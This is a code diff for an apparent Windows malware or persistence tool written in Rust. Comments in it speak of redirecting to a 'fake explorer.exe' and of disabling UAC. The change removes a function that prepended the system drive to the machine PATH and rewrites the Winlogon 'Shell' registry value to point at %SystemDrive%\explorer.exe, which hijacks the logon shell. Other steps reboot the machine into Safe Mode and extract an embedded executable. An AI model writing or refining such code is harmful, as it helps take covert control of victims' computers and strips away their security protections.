@@ -2,7 +2,7 @@ use std::process::{Command, Stdio, exit};
 use std::path::{Path};
 use std::fs::{File};
 use std::io::{self, Write};
-use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
+use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE};
 use winreg::RegKey;
 use std::fs;
 use std::env;
@@ -155,53 +155,6 @@ fn reboot_system() -> io::Result<()> {
     Ok(())
 }
 
-fn set_system_path_first() -> io::Result<()> {
-    // Retrieve the current PATH (this may be the user or process PATH)
-    let mut current_path = env::var("PATH").unwrap_or_default();
-
-    // Trim any leading/trailing spaces and quotes from the whole string
-    current_path = current_path.trim().trim_matches('"').to_string();
-
-    let parts: Vec<&str> = current_path.split(';').collect();
-
-    // Retrieve the system drive (typically C:)
-    let system_drive = env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());
-
-    // Check if the first non-empty element is the system drive path
-    let system_drive_path = format!("{}\\", system_drive);
-    if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
-        if first.trim().eq_ignore_ascii_case(&system_drive_path) {
-            println!("[+] System PATH already starts with {}\\", system_drive);
-            return Ok(());
-        }
-    }
-
-    // Prepend the system drive to the current PATH
-    let new_path = format!("{}\\;{}", system_drive, current_path);
-
-    // Remove *all* quotes that might be in the new_path string.
-    // (This removes any accidental quotes from any of the segments.)
-    let sanitized_path = new_path.replace("\"", "");
-
-    // Call setx directly (bypassing cmd /C) to update the machine PATH.
-    // Note: setx has a limit on the length of the variable (typically 1024 characters)
-    let output = Command::new("setx")
-        .args(&["/M", "PATH", &sanitized_path])
-        .output();
-
-    if let Ok(output) = output {
-        if output.status.success() {
-            println!("[+] PATH successfully updated.");
-        } else {
-            eprintln!("Error updating system PATH: {:?}", output);
-        }
-    } else {
-        eprintln!("Failed to execute setx command.");
-    }
-
-    Ok(())
-}
-
 fn create_directory() -> io::Result<()> {
     // Retrieve the Program Files directory dynamically
     let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());
@@ -224,18 +177,18 @@ fn create_directory() -> io::Result<()> {
 }
 
 fn modify_registry() -> io::Result<()> {
-    // Open the registry key for Winlogon
+    // Open the registry key for Winlogon with write access
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let winlogon_key = hkcu.open_subkey_with_flags(
+    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
         r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-        KEY_SET_VALUE,
+        KEY_WRITE,
     )?;
 
-    // Set new "Shell" value (overwrites existing one)
-    let new_shell_value = r"cmd.exe explorer.exe";  
+    // Set the new "Shell" value
+    let new_shell_value = r"%SystemDrive%\explorer.exe";  
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
-    println!("Registry modified successfully: Shell set to \"cmd.exe explorer.exe\".");
+    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
 
     Ok(())
 }
@@ -285,23 +238,17 @@ fn main() {
         eprintln!("Error extracting embedded safe boot executable: {}", e);
     }
     
-    // Step 7: Use set system path first to redirect to fake explorer.exe
-    if let Err(e) = set_system_path_first() {
-        eprintln!("Error setting system path: {}", e);
-        return;
-    }
-
-    // Step 8: Reboot the system to Safe Mode if needed
+    // Step 7: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
-    // Step 9: Disable UAC
+    // Step 8: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
 
-    // Step 10: Modify Registry
+    // Step 9: Modify Registry
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying registry: {}", e);
     }
